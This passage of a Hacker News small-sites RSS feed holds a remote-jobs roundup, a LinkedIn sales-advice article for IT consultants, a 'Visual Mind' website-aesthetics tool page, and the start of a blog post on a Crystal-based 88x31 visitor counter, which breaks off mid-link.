<br> üì® Wanna get an intro with Rich, CTO at Jupiter? <a href="https://airtable.com/shrzoNF0Lcz50u9oh?prefill_open_for_offers=TRUE%20&amp;prefill_extra_info_reported=I%27m%20interested%20in%20the%20Senior%20Software%20Developer%20position%20at%20Jupiter.%0A%0AThis%20is%20why%20I%20think%20I%27m%20a%20great%20candidate%20for%20this%20position%3A" target="_blank" rel="noopener noreferrer">Join NoiceJobs</a> if you haven't yet or <a href="https://blog.noicejobs.com/cdn-cgi/l/email-protection#0a72656f664a646563696f606568792469656735797f68606f697e3743647e78652f383a6c65782f383a7e626f2f383a596f646365782f383a59656c7e7d6b786f2f383a4e6f7c6f66657a6f782f383a7a6579637e6365642f383a6b7e2f383a407f7a637e6f78" target="_blank" rel="noopener noreferrer">email us</a> if you're a member already.
<br> </li> </ul>
<p> Wanna promote your job on NoiceJobs? <a href="#hiring">Check this out</a> </p><p>This post will make it easier to navigate the blog and all the different categories. Jump to...</p><ul> <li> <a href="#Engineering">üñ• Best Remote Engineering jobs found this week</a> </li> <li> <a href="#Product">üñº Best Remote Product jobs found this week</a> </li> <li> <a href="#Business">üíµ Best Remote Business jobs found this week</a> </li> <li> <a href="#Other">üíº Best Other Remote jobs found this week</a> </li> </ul>
<p>BTW: now you can also get these jobs every week <a href="#newsletter">via email!</a></p><h2 id="-best-remote-engineering-jobs-found-this-week">üñ• Best Remote Engineering jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cto-26-tech-lead-remote-jobs-between-sep-11-and-sep-18/">CTO &amp; Tech Lead jobs</a><br><a href="https://blog.noicejobs.com/best-senior-engineering-manager-remote-jobs-between-sep-11-and-sep-18/">Engineering Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-fullstack-remote-jobs-between-sep-11-and-sep-18/">Fullstack jobs</a><br><a href="https://blog.noicejobs.com/best-senior-frontend-remote-jobs-between-sep-11-and-sep-18/">Frontend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-backend-remote-jobs-between-sep-11-and-sep-18/">Backend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sre-26-devops-remote-jobs-between-sep-11-and-sep-18/">SRE &amp; Devops jobs</a><br><a href="https://blog.noicejobs.com/best-senior-infosec-remote-jobs-between-sep-11-and-sep-18/">Infosec jobs</a><br><a href="https://blog.noicejobs.com/best-senior-mobile-remote-jobs-between-sep-11-and-sep-18/">Mobile jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ios-remote-jobs-between-sep-11-and-sep-18/">iOS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-android-remote-jobs-between-sep-11-and-sep-18/">Android jobs</a><br><a href="https://blog.noicejobs.com/best-senior-python-remote-jobs-between-sep-11-and-sep-18/">Python jobs</a><br><a href="https://blog.noicejobs.com/best-senior-javascript-remote-jobs-between-sep-11-and-sep-18/">Javascript jobs</a><br><a href="https://blog.noicejobs.com/best-senior-java-remote-jobs-between-sep-11-and-sep-18/">Java jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rails-ruby-remote-jobs-between-sep-11-and-sep-18-2/">Rails/Ruby jobs</a><br><a href="https://blog.noicejobs.com/best-senior-go-remote-jobs-between-sep-11-and-sep-18/">Go jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rust-remote-jobs-between-sep-11-and-sep-18/">Rust jobs</a><br><a href="https://blog.noicejobs.com/best-senior-php-remote-jobs-between-sep-11-and-sep-18/">PHP jobs</a><br><a href="https://blog.noicejobs.com/best-senior-wordpress-remote-jobs-between-sep-11-and-sep-18/">Wordpress jobs</a><br><a href="https://blog.noicejobs.com/best-senior-qa-remote-jobs-between-sep-11-and-sep-18/">QA jobs</a><br><a href="https://blog.noicejobs.com/best-senior-solutions-architect-remote-jobs-between-sep-11-and-sep-18/">Solutions Architect jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-science-26-ml-remote-jobs-between-sep-11-and-sep-18-2/">Data Science &amp; ML jobs</a><br><a href="https://blog.noicejobs.com/best-senior-nlp-26-nlg-remote-jobs-between-sep-11-and-sep-18-2/">NLP &amp; NLG jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-engineering-26-big-data-remote-jobs-between-sep-11-and-sep-18-2/">Data Engineering &amp; Big Data jobs</a><br><a href="https://blog.noicejobs.com/best-senior-shopify-remote-jobs-between-sep-11-and-sep-18/">Shopify jobs</a><br><a href="https://blog.noicejobs.com/best-senior-gis-remote-jobs-between-sep-11-and-sep-18/">GIS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-react-remote-jobs-between-sep-11-and-sep-18/">React jobs</a><br><a href="https://blog.noicejobs.com/best-senior-vue-remote-jobs-between-sep-11-and-sep-18/">Vue jobs</a><br><a href="https://blog.noicejobs.com/best-devrel-remote-jobs-found-between-sep-02-and-sep-09/">DevRel jobs</a><br><a href="https://blog.noicejobs.com/best-senior-game-dev-26-design-remote-jobs-between-sep-11-and-sep-18-2/">Game Dev &amp; Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-haskell-remote-jobs-between-sep-11-and-sep-18/">Haskell jobs</a><br><a href="https://blog.noicejobs.com/best-senior-scala-remote-jobs-between-sep-11-and-sep-18/">Scala jobs</a><br><a href="https://blog.noicejobs.com/best-generalist-remote-jobs-between-sep-11-and-sep-18/">Generalist jobs</a><br><a href="https://blog.noicejobs.com/best-senior-c-2b-2b-remote-jobs-between-sep-11-and-sep-18-2/">C++ jobs</a><br><a href="https://blog.noicejobs.com/best-senior-net-remote-jobs-between-sep-11-and-sep-18-2/">.NET jobs</a><br></p><h2 id="-best-remote-product-jobs-found-this-week">üñº Best Remote Product jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cpo-remote-jobs-between-sep-11-and-sep-18/">CPO jobs</a><br><a href="https://blog.noicejobs.com/best-senior-product-manager-remote-jobs-between-sep-11-and-sep-18/">Product Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ux-26-product-design-remote-jobs-between-sep-11-and-sep-18/">UX &amp; Product Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ui-design-remote-jobs-between-sep-11-and-sep-18/">UI Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-art-26-visual-design-remote-jobs-between-sep-11-and-sep-18/">Art &amp; Visual Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-copywriting-remote-jobs-between-sep-11-and-sep-18/">Copywriting jobs</a><br><a href="https://blog.noicejobs.com/best-senior-video-editing-remote-jobs-between-sep-11-and-sep-18/">Video Editing jobs</a><br></p><h2 id="-best-remote-business-jobs-found-this-week">üíµ Best Remote Business jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-sales-remote-jobs-between-sep-11-and-sep-18/">Sales jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sdr-remote-jobs-between-sep-11-and-sep-18/">SDR jobs</a><br><a href="https://blog.noicejobs.com/best-senior-legal-remote-jobs-between-sep-11-and-sep-18/">Legal jobs</a><br><a href="https://blog.noicejobs.com/best-senior-operations-remote-jobs-between-sep-11-and-sep-18/">Operations jobs</a><br><a href="https://blog.noicejobs.com/best-senior-customer-support-remote-jobs-between-sep-11-and-sep-18/">Customer Support jobs</a><br><a href="https://blog.noicejobs.com/best-senior-seo-2c-sem-remote-jobs-between-sep-11-and-sep-18/">SEO, SEM jobs</a><br><a href="https://blog.noicejobs.com/best-senior-marketing-remote-jobs-between-sep-11-and-sep-18/">Marketing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-growth-remote-jobs-between-sep-11-and-sep-18/">Growth jobs</a><br><a href="https://blog.noicejobs.com/best-senior-agile-scrum-remote-jobs-between-sep-11-and-sep-18-2/">Agile/Scrum jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-business-analyst-remote-jobs-between-sep-11-and-sep-18-2/">Data/Business Analyst jobs</a><br><a href="https://blog.noicejobs.com/best-senior-finance-26-investing-remote-jobs-between-sep-11-and-sep-18-2/">Finance &amp; Investing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-accounting-26-bookkeping-remote-jobs-between-sep-11-and-sep-18-2/">Accounting &amp; Bookkeping jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ecommerce-remote-jobs-between-sep-11-and-sep-18/">Ecommerce jobs</a><br><a href="https://blog.noicejobs.com/best-senior-social-media-remote-jobs-between-sep-11-and-sep-18/">Social Media jobs</a><br></p><h2 id="-best-other-remote-jobs-found-this-week">üíº Best Other Remote jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-software-contract-26-freelance-remote-jobs-between-sep-11-and-sep-18/">Software Contract &amp; Freelance jobs</a><br><a href="https://blog.noicejobs.com/best-senior-software-part-time-remote-jobs-between-sep-11-and-sep-18/">Software Part-time jobs</a><br><a href="https://blog.noicejobs.com/best-junior-remote-jobs-between-sep-11-and-sep-18/">Junior jobs</a><br></p>
<h2>üì© Get these jobs as weekly newsletters</h2>

<h2 id="hiring"> Are you hiring remotely?
</h2>
<p> üì£ If so, you can now <a href="https://airtable.com/shreWkzRKtq6oQFiK" target="_blank" rel="noopener noreferrer">post a job on NoiceJobs</a> to reach up to thousands of talented remote workers.
</p>
<p> Some numbers on NoiceJobs' audience:
</p>
<ul> <li> More than <b>3000 subscribers</b> on our <a href="https://t.me/noicejobs" target="_blank" rel="noopener noreferrer">Telegram channels</a> </li> <li> <b>Hundreds of people registered</b> on NoiceJobs and get these posts weekly </li> <li> This blog (launched on September 9) had <b><span id="pageviews"></span> page views</b> in the last month (verified by <a href="https://referral.simpleanalytics.com/xoel" target="_blank" rel="noopener noreferrer">Simple Analytics</a>). </li> <li> Our traffic analytics are 100% open. <a href="https://simpleanalytics.com/blog.noicejobs.com" target="_blank" rel="noopener noreferrer">Check them out here üëÄ</a> and see our pageviews in the graph below </li>
</ul>
<div> <p> A cool graph with our visits would go here, but ad blockers don't like the Simple Analytics embed. Disable yours if you'd like to view it :) </p>
</div>
<h3 id="that-s-it-">That's it!</h3><p>I also share jobs like these in these <a href="https://t.me/NoiceJobs">Telegram channels</a>. More than 3,000 people are subscribed to them.</p><p>Have a good weekend!</p><p>Xoel - <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">I'm on Twitter too. Say hi!</a></p>
</div>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526323</guid>
            <pubDate>Sat, 19 Sep 2020 09:51:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Way to Find Clients for Your IT Consulting Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526274">thread link</a>) | @kureikain
<br/>
September 19, 2020 | https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/ | <a href="https://web.archive.org/web/*/https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-197">

    

	<div>

		
<p>As an experienced software engineer or IT professional, you have spent many years building up your expertise and your skill-set. You‚Äôve built many solutions and you have solved many problems for clients of various sizes. You have finally decided to turn your expertise into a proper business and escape the rat race once and for all. </p>



<p>Perhaps you‚Äôve even put a team together and have managed to secure a client or two with some decent projects. Everything is looking promising. </p>



<p>Except you run into a little problem. </p>



<p>You have NO idea how to get more clients. </p>



<p>The B2B sales process for technology products and services is complicated, it requires reaching out to the right people who are in a position to make a decision and navigating a complex sales cycle, and you don‚Äôt even know where to begin. In fact, you hate this part You really really do. You‚Äôre a technology person after all. You‚Äôre brilliant at what you do. Surely you shouldn‚Äôt have to engage in low-life scummy sales tactics to find clients. You really hate this part. </p>



<p>But you have a business now, so you try. You send out some cold e-mails. You pitch some people on LinkedIn. You spend some money on social media ads, and it just goes down a drain. And then‚Ä¶. nothing. Zero. You have NO new clients. You‚Äôre in a rut. You begin to panic.</p>



<hr>



<p>But there is good news. </p>



<p>Let‚Äôs take a step back. Whenever you find yourself in a rut, always take a step back. Take a few deep breaths, calm yourself down for a moment, and try to get more general. Try to look at the big picture. You have to put the problems aside for a moment so you can clear your mind and take a fresh look.</p>



<p>The good news is that there is a clear path to what you want.</p>



<p>In fact, you already have the components in place.</p>



<p>The first step is to realise that your professional career so far has given you a valuable competitive advantage.</p>



<p>You now know certain things and can do certain things that very few people on the planet know or can do. </p>



<p>The second step is to realise there is demand for these special skills and knowledge you possess.</p>



<p>There are business owners, managers, decision makers, leaders who are, right now, in need of what you know and what you can do for them. More importantly, many of them have both the willingness and the ability to compensate you generously if you can help them solve specific challenges they are currently facing, or specific goals they are currently committed to achieving.</p>



<p>The third step is to realise that you already have direct access to most of these people. It‚Äôs called LinkedIn (or, more broadly, social media).</p>



<p>As you can see, I was not being wishy-washy when I said the components are already in place. All 3 of the above are indeed already in place.</p>



<p>The path to what you want is through aligning yourself ‚Äì your internal beliefs, your presentation and the messaging you put out ‚Äì so you position yourself to be the natural choice for those seeking your expertise.</p>



<p>And yes, you do have to learn to sell. But this doesn‚Äôt have to be so intimidating and you certainly don‚Äôt have to feel like a low-life doing this. So take another deep breath, and allow yourself to get friendly with sales for a moment. Soon you will be best friends ‚Äì better than you know. </p>



<p>I‚Äôll give you a blueprint to follow, right here in this post. And in the future I‚Äôll go into many more details, but this here should be more than enough to get you started. You shouldn‚Äôt need ANYTHING else, don‚Äôt get yourself overwhelmed. It‚Äôs actually very simple and even easy. </p>



<p>First I‚Äôll tell you what NOT to do. </p>



<p>Then I‚Äôll give you a few basic steps to follow.</p>



<hr>



<p>First and foremost ‚Äì DO NOT go hire anyone to do this for you. Trust me on this one. No one can market or sell your product for you before you‚Äôve mastered this process yourself first. You MUST learn to sell your own products and services, there is no way around it. What‚Äôs more ‚Äì no one can do it better than you. You KNOW what you‚Äôre good at. You KNOW what you‚Äôve been able to do for other clients before. You KNOW what problems you‚Äôve been able to solve. You‚Äôve SEEN people and businesses struggle and make wrong decisions and regret them and you KNOW how to do this right. You know how to do it better. No one else can communicate this better than you. No one can be more convincing. No one can connect with your future clients better than you. </p>



<p>Second, avoid paid advertising before you‚Äôve learned how to generate high-ticket sales without it. Paid ads are an amplifier. If you‚Äôre making zero sales right now, the result of putting lots and lots of money in paid ads will be lots and lots of money multiplied by zero. Don‚Äôt waste your time and money doing this. I‚Äôve been there. It ain‚Äôt pretty. </p>



<p>Repeat after me: Paid ads and sales people are for scaling only. Once you‚Äôve got your offer and your messaging down to a proven working system, you can then pay for ads and hire sales people to go 10x or 100x bigger. But you are not ready for this. Delay this phase as long as possible. When the time comes, you will know it. </p>



<p>Finally, for the love kittens, please don‚Äôt go spamming people left and right with your offer. Don‚Äôt send e-mails. Don‚Äôt talk to strangers on messenger. Don‚Äôt call them on the phone. Don‚Äôt ask for appointments. Just don‚Äôt, ok? Don‚Äôt do it. No one likes that. It won‚Äôt get you anywhere. </p>



<p>There IS a better way.</p>



<hr>



<p>So here is what to do.</p>



<p>You can get started today, easily. And you can see results quickly, without spending a fortune on anyone or anything.</p>



<p>Your biggest problem right now is obscurity. No one knows you exist. Simple as that.</p>



<p>To start getting more sales, you have to get out there where relevant people can see you so that A) they know you exist and B) you get an opportunity to speak directly to their current pains and frustrations.</p>



<p>As tacky as it sounds, social media turns out to be useful for this.</p>



<p>I‚Äôve found that LinkedIn can be pretty great for B2B sales ‚Äì but I‚Äôve also seen people get good results with high-ticket sales on Facebook as well. (Once again, though ‚Äì DO NOT just go spamming people on LinkedIn! Keep calm and read on.)</p>



<p>There is a structure and sequence to the approach. You have to do things in the right order  and you have to get through some things first, but it‚Äôs easy, there‚Äôs no big expenses involved, and you can start getting results in weeks or even days if you do this right.</p>



<p>The first steps go like this:</p>



<ol><li>Get as much clarity as you can on who your ideal clients are and what your main offer is. I think you already have a good idea about this, but always worth thinking harder about it and putting it in writing for yourself and your team. Make sure to think about your ideal client as A PERSON, even if we‚Äôre talking billion-dollar corporations here. At the end of the day someone has to make a decision and write a check.</li><li>Prime your LinkedIn profile. Make it look professional. Use the tag-line to speak directly to your ideal buyer (this requires some creativity and it‚Äôs a bit of a process ‚Äì don‚Äôt be afraid to keep changing it, but once you find something that works, stick with it.) Use the longer ‚ÄúAbout‚Äù section to do more of the same. You have to basically turn that into a mini sales letter. Don‚Äôt go into many technical details ‚Äì always write as if it‚Äôs coming out of your ideal client‚Äôs head. Think of their situation, their current struggles and challenges, the urgency of the problem, and how you can relieve that. Talk about what they will gain from working with you and the amount of time, effort and money they will save.</li><li>Start adding very targeted connections ‚Äì on a daily basis. If you wish, you can pay for LinkedIn‚Äôs Sales Navigator, but I‚Äôve found that the basic search works good enough for me. Every day run a search for people who may be in a position to make decisions about your offer (or go through your LinkedIn network recommendations) and just send out connection requests to 5 ‚Äì 10 people each day day (but don‚Äôt go crazy and start adding everyone indiscriminately.) You can add a little personalisation note, but I‚Äôm not sure it makes much of a difference with most people. Your profile (and especially the tag-line) should be able to speak for itself. There are people who use LinkedIn for networking and they will usually accept your connection request. Then there are people who don‚Äôt like connecting with strangers and they will ignore you. Don‚Äôt make a big deal out of it, don‚Äôt take it personally, just stick to the process and turn it into a habit.</li><li>While you are growing your network, start making more regular posts. You should aim for once a day, on average. You can do more (but not much more) or less (but not much less). In your posts, you can do a number of different things, but the whole point is to imagine you are speaking directly to your ideal clients. Don‚Äôt be too sales-y all the time, just speak from your expertise and experience. Talk about their problems and your solution to them. Talk about what you‚Äôve done for other similar clients and the specific benefits they‚Äôve experienced. Talk especially about saving time ‚Äì that‚Äôs a big one. </li><li>Don‚Äôt be discouraged if you get little to no interactions with your posts at first! This DOESN‚ÄôT mean people aren‚Äôt reading your content. Many people (especially busy people) will not react to your content, but if it‚Äôs relevant they WILL read it. When people do start interacting with your posts, feel free to start conversations with them. Keep the conversation exploratory and see how you can be of service. If you can get them on the phone, even better. Just keep this in mind: your first job is NOT to try to sell them anything. It‚Äôs to understand whether or not you‚Äôre a good fit for working together and to genuinely give them the advice that‚Äôs best for them. If this happens to mean working with you, great ‚Äì don‚Äôt be shy about it either. </li><li>Once every few weeks, make a post with a very direct offer, ‚Ä¶</li></ol></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</a></em></p>]]>
            </description>
            <link>https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526274</guid>
            <pubDate>Sat, 19 Sep 2020 09:38:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: How attractive is your website? Check using Visual Mind AI]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 160 (<a href="https://news.ycombinator.com/item?id=24525995">thread link</a>) | @myraahio
<br/>
September 19, 2020 | https://myraah.io/visualmind | <a href="https://web.archive.org/web/*/https://myraah.io/visualmind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              
              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website‚Äôs appeal within a split second.  This first impression is influential enough to later affect their opinions of a site‚Äôs usability and trustworthiness.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind ?</h4>
              <p>Visual Mind is an AI engine specifically designed for understanding and scoring visual appearance of a website. Visual Mind has analyzed over a million websites to achieve an accuracy rate of over 97%.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you ‚Äúfast-tested‚Äù your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score ‚Äì provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>
              <p><a href="https://myraah.io/index.php/visualmind">Check Your VM SCORE</a></p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
				<h4>Want to explore more ‚Äì we recommend</h4>
              <p>A.  Bauerly, M., and Liu, Y. Effects of Symmetry and Number of Compositional Elements on Interface and Design Aesthetics. Int. Journal of Human-Computer Interaction 3 (2008).</p>
              <p>B. Cyr, D. Modeling Website Design across Cultures: Relationships to Trust, Satisfaction and E-loyalty. Journal of Management Information Systems 24, 4 (2008)</p>
              <p>C. Everard, A., and Galletta, D. How presentation flaws affect perceived site quality, trust, and intention to purchase from an online store. Journal of Management Information Systems 22, 3 (2006)</p>
              <p>D. Geissler, G., Zinkhan, G., and Watson, R. The Influence of Home Page Complexity on Consumer Attention, Attitudes, and Purchase Intent. Journal of Advertising 35, 2 (2006)</p>
              <p>E. Hall, R. H., and Hanna, P. The Impact of Web Page Text-background Colour Combinations on Readability,Retention, Aesthetics and Behavioural Intention. Behaviour &amp; Information Technology 23, 3 (2004)</p>
              <p>G. Lindgaard, G., Fernandes, G., Dudek, C., and Brown, J. Attention Web Designers: You Have 50 Milliseconds to Make a Good First Impression! Behaviour &amp; Information Technology 25, 2 (2006)</p>
              <p>H. Michailidou, E., Harper, S., and Bechhofer, S. Visual Complexity and Aesthetic Perception of Web Pages. Proc. Design of Communication (2008)</p>
              <p>I. Tuch, A. N., Bargas-Avila, J. A., and Opwis, K. Symmetry and Aesthetics in Website Design: It‚Äôs a Man‚Äôs Business. Computers in Human Behavior 26, 6 (2010)</p>
              
			</div>
          </div> <!-- col -->
        </div></div>]]>
            </description>
            <link>https://myraah.io/visualmind</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525995</guid>
            <pubDate>Sat, 19 Sep 2020 08:13:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CrazyFast Crystal based 88x31 visitor counter img generator brought back to 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525873">thread link</a>) | @gcds
<br/>
September 19, 2020 | https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: A Crystal based super fast visitor counter">
            </figure>

            <section>
                <div>
                    <p>I have taken this week's holidays with the plan that the Overkill Workbench materials would be delivered today, but in the end, it will be delivered on Sunday, so I have a lot of free time on my hands.</p><p>Yesterday, while talking with some friends, I remembered old good &lt;2008 websites, portals, and how we created them; one of the most prominent features I loved about that period was 88x31, and 120x60 sized Ad's/Counters and other goodies. It was always a fight between website authors fighting for a higher number of page visits and similar metrics. Nowadays, everything is hidden and typical, only seen by webmasters on Google Analytics and similar tools.</p><p>So today's my evening project is <a href="https://crystal-lang.org/">Crystal</a> language-based 88x31 website visitor counter image rendered entirely in <a href="https://crystal-lang.org/">Crystal</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-60.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-60.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-60.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-60.png 1600w, https://www.techprowd.com/content/images/2020/09/image-60.png 1754w" sizes="(min-width: 720px) 720px"></figure><h2 id="requirements-">Requirements:</h2><ul><li>A single endpoint would return 88x31 sized png with numbers</li><li>Provide two numbers, one unique visitor count, and other total visits.</li><li>Do not depend on external libraries for image generation.</li><li>Use the least amount of resources like memory and disk space. (Maybe one day my blog will be viral, who knows)</li><li>Most important, be as fast as possible!</li></ul><h2 id="architecture-">Architecture:</h2><p>The plan is to run the crystal internal HTTP server without any overhangs and host it on Heroku free plan.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-61.png" alt=""></figure><p>Store user identifiers in Redis for uniqueness measurement and fast lookup (Remember we need speed)</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source.gif" alt=""></figure><p>I found a shard (Crystal libraries are called shards) for image rendering, which can generate a PNG image using raw X, Y pixel information no external libraries used.</p><figure><a href="https://github.com/stumpycr/stumpy_png"><div><p>stumpycr/stumpy_png</p><p>Read/Write PNG images in pure Crystal. Contribute to stumpycr/stumpy_png development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/27729351?s=400&amp;v=4"></p></a></figure><p>For Redis client, I am going to use this shard:</p><figure><a href="https://github.com/stefanwille/crystal-redis"><div><p>stefanwille/crystal-redis</p><p>Full featured Redis client for Crystal. Contribute to stefanwille/crystal-redis development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>stefanwille</span><span>GitHub</span></p></div><p><img src="https://avatars2.githubusercontent.com/u/331756?s=400&amp;v=4"></p></a></figure><h2 id="step-1-rendering-image">Step 1: Rendering image</h2><p>As I have chosen image size to be 88x31, I need to try to fit two numbers. Total visits - Every load counts and Unique Visitors - Number of unique visitors.</p><p>I have drawn some sample representation I imagine in Photoshop:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-62.png" alt=""></figure><p>It looks tiny on my 4K monitor, but back in 2005, it looked huge on my 1024x768 monitor.</p><p>One of the problems now that I am not using external libraries is that I have no simple way to render text on the image. That's not a big deal, remembering practices I used for Graphical LCD/OLED on embedded electronic projects. I will create an array of Tuples of 3 uint8 integers of each pixel information in a 7x10 array for each number.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-64.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-64.png 600w, https://www.techprowd.com/content/images/2020/09/image-64.png 800w" sizes="(min-width: 720px) 720px"></figure><p>To make each number in array format, I need to generate 7x10 images of each number. Then using the <a href="https://javl.github.io/image2cpp/">https://javl.github.io/image2cpp/</a> tool, I generated arrays for each character.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200